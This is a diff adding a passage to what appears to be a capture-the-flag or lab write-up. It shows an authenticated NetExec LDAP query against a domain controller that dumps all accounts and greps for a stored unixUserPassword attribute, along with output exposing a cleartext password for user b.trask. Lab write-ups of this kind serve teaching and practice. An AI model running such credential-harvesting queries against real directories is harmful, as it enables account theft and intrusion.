@@ -1108,6 +1108,23 @@ Found a password
 I ran this as a shot in the dark
 
 ```python
+nxc ldap dc01.trask.hsm -u m.mold -p '(master-shiny)20' -k --query '(sAMAccountName=*)' '' | grep -C 5 'unixUserPassword'
+LDAP                     dc01.trask.hsm  389    DC01             userPrincipalName    b.trask@trask.hsm
+LDAP                     dc01.trask.hsm  389    DC01             objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=trask,DC=hsm
+LDAP                     dc01.trask.hsm  389    DC01             dSCorePropagationData 20260302190435.0Z
+LDAP                     dc01.trask.hsm  389    DC01                                  16010101000000.0Z
+LDAP                     dc01.trask.hsm  389    DC01             lastLogonTimestamp   134323245666816964
+LDAP                     dc01.trask.hsm  389    DC01             unixUserPassword     BJHsryNwjbruNwKyNBRJw4
+LDAP                     dc01.trask.hsm  389    DC01             mail                 b.trask@trask.hsm
+LDAP                     dc01.trask.hsm  389    DC01             mobile               215-664-1950
+LDAP                     dc01.trask.hsm  389    DC01             [+] Response for object: CN=Backup Operators,CN=Builtin,DC=trask,DC=hsm
+LDAP                     dc01.trask.hsm  389    DC01             objectClass          top
+LDAP                     dc01.trask.hsm  389    DC01                                  group
+```
+
+Then ill grep for that specific attribute and add some context, this password is for the user `b.trask`
+
+```python
 
 ```
 
